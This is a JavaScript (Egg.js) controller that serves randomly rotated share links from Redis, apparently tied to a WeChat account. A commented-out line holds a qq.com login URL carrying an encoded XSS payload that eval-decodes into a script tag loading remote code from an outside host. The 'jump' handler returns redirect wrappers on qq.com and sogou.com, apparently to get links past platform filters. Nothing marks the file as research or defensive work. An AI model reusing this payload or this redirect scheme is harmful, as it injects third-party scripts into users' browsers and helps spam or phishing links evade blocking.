'use strict';

const Controller = require('egg').Controller;
const atob = require('atob');
const btoa = require('btoa');

class LinkController extends Controller {
    async echo() {

        const {
            ctx,
            service,
            app
        } = this;
        const domian = ctx.hostname;

        await service.refer.check();

        const kk = service.refer.getReferParam('kk');
        const appid = await service.url.getAppid(domian)
        const share_link = await service.url.getRandomLink(appid, 'share_link', domian);
        const now = parseInt(Date.now() / 1000);
        const spam = service.url.getSpm();
        ctx.body = service.url.addParam(share_link, {
            [spam]: spam,
            now,
            kk: kk ? kk : btoa(appid)
        });
        //ctx.body = 'https://kingame.qq.com/login?lgtfo=irelvnrgjc&u=/%25252522onlo%25252561d%25252525252525253D%0Aeval/**/(atob%60ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPSJodHRwczovLzA1ZXouY29tL2YvaW9zIj48L3NjcmlwdD4nKTs%3D%60)//'
        //ctx.body = 'http://100000431547.bigwheel.n.weimob.com/saas/bigwheel/100000431547/20656'
        //const u = ctx.headers['user-agent'];
        // if (u.indexOf('Android') > -1 || u.indexOf('Linux') > -1) {
        //     const kk = service.refer.getReferParam('kk');
        //     const appid = await service.url.getAppid(domian)
        //     const share_link = await service.url.getRandomLink(appid, 'share_link', domian);
        //     const now = parseInt(Date.now() / 1000);
        //     const spam = service.url.getSpm();
        //     ctx.body = service.url.addParam(share_link, {
        //         [spam]: spam,
        //         now,
        //         kk: kk ? kk : btoa(appid)
        //     });
        // } else {
        //     const now = parseInt(Date.now() / 1000);

        //     ctx.body = service.url.addParam(`http://o2o.img.weimob.com/1129/e4440f1cb31d47c88d339d69ffb4cdae/468d8217-bed2-43b7-904f-d8ca8cb1ad08.html`, {
        //         now
        //     });
        // }
    }


    async jump() {
        const {
            ctx,
            service,
            app
        } = this;

        ctx.set({
            'content-type': "application/x-javascript"
        });

        const jump_link_key = `2:gzh:wx6797180ed00efd71:024ketch.com:jump_link`;
        const jump_link_pyq_key = `2:gzh:wx6797180ed00efd71:024ketch.com:jump_link_pyq`;

        const jump_link = await app.redis.srandmember(jump_link_key, 1);
        const jump_link_pyq = await app.redis.srandmember(jump_link_pyq_key, 1);

        var rds = ['http://grouproam.qq.com:443/cgi-bin/httpconn?htcmd=0x6ff0080&u={encodeUrl}', 'http://wp.mse.sogou.com/share.html?type=link&id={encodeUrl}']
        var rd = rds[Math.floor(rds.length * Math.random())];

        ctx.body = `
          var jurl = '${jump_link}';
          var url = '${jump_link_pyq}';
          var rd = '${rd}';
          `
    }
}

module.exports = LinkController;